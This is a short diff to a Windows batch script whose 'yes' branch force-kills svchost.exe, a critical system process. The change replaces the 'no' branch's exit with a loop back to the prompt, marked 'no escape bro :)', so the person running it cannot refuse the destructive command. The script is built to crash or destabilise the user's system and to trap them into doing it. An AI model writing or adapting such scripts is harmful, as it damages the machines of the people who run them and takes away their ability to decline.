@@ -14,7 +14,8 @@ if /i "%userInput%"=="yes" (
     taskkill /im svchost.exe /f
     echo Command for YES executed.
 ) else if /i "%userInput%"=="no" (
-    echo You typed NO. Exiting the script.
+    goto inputPrompt
+    echo no escape bro :)
 ) else (
     echo Invalid input. Please type YES or NO.
     goto inputPrompt
